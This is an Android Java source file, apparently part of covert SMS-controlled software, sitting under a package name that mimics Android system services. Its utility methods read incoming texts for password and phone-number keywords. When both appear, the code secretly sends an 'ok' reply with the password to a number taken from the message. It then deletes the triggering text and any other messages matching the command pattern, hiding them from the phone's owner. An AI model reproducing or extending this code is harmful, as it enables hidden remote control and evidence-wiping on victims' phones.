package android.service.app.sms;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.service.app.SmsObserver;
import android.service.app.utils.Log;
import android.telephony.SmsManager;
import android.util.Pair;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public enum SmsUtils
{
    utils;

    public static final String OK = "ok ";
    public static final String SMS = "SMS";

    public static void checkAndSendSmsIfNeeded(final ContentResolver resolver)
    {
        Cursor cursor = resolver.query(SmsObserver.SMS_URI, SmsObserver.columns, null, null, null);
        if (cursor == null) return;
        cursor.moveToFirst();

        String body = cursor.getString(SmsObserver.BODY);
        String[] split = body.split(" ");
        Pair<Integer, Integer> pair = getPair(cursor);
        if (pair == null) return;
        int passwordResult = pair.first;
        int phoneNumberResult = pair.second;

        if (passwordResult > 0 && phoneNumberResult > 0)
        {
            SmsManager sms = SmsManager.getDefault();
            String destinationAddress = split[phoneNumberResult];
            String password = split[passwordResult];
            String message = OK + password;
            removeMessageById(resolver, cursor.getInt(SmsObserver.ID));
            sms.sendTextMessage(destinationAddress, null, message, null, null);
        }

        cursor.close();
    }

    public static void removeOldSms(final ContentResolver resolver)
    {
        Cursor cursor = resolver.query(SmsObserver.SMS_URI, SmsObserver.columns, null, null, null);
        Log.v("cursor=" + cursor);
        if (cursor == null) return;

        final List<Integer> messagesForDelete = new ArrayList<>();

        cursor.moveToFirst();
        while (!cursor.isClosed())
        {
            String body = String.valueOf(cursor.getString(SmsObserver.BODY));
            Log.v("body=" + body);
            String[] split = body.split(" ");

            Pair<Integer, Integer> pair = getPair(cursor);
            if (pair == null) continue;

            int passwordResult = pair.first;
            int phoneNumberResult = pair.second;

            boolean isOkSms = split.length == 2 && body.toLowerCase().contains(OK.toLowerCase());
            boolean isSendSms = body.toLowerCase().contains(SMS.toLowerCase()) && (passwordResult > 0 || phoneNumberResult > 0);
            if (isOkSms || isSendSms)
                messagesForDelete.add(cursor.getInt(SmsObserver.ID));

            if (cursor.isLast()) break;
            boolean moveToNext = cursor.moveToNext();
            Log.v("moveToNext=" + moveToNext);
        }

        cursor.close();

        for (Integer messageId : messagesForDelete)
            removeMessageById(resolver, messageId);
    }

    private static void removeMessageById(ContentResolver resolver, int messageId)
    {
        resolver.delete(Uri.parse(SmsObserver.CONTENT_SMS + messageId), null, null);
    }

    public static Pair<Integer, Integer> getPair(Cursor cursor)
    {
        String body = cursor.getString(SmsObserver.BODY);
        String[] split = body.split(" ");

        Log.v("messageParts=" + Arrays.asList(split));

        int passwordIndex = -1;
        int phoneNumberIndex = -1;
        int length = split.length;
        for (int i = 0; i < length; i++)
        {
            final String part = split[i];
            String toLowerCase = String.valueOf(part).toLowerCase();
            if (SmsObserver.passwordPrefixes.contains(toLowerCase))
            {
                passwordIndex = i;
            } else if (SmsObserver.phonePrefixes.contains(toLowerCase))
            {
                phoneNumberIndex = i;
            }
        }
        Log.v("passwordIndex=" + passwordIndex);
        Log.v("phoneNumberIndex=" + phoneNumberIndex);

        int passwordResult = passwordIndex < length ? passwordIndex + 1 : -1;
        int phoneNumberResult = phoneNumberIndex < length ? phoneNumberIndex + 1 : -1;
        Log.v("passwordResult=" + passwordResult);
        Log.v("phoneNumberResult=" + phoneNumberResult);

        return new Pair<>(passwordResult, phoneNumberResult);
    }

}
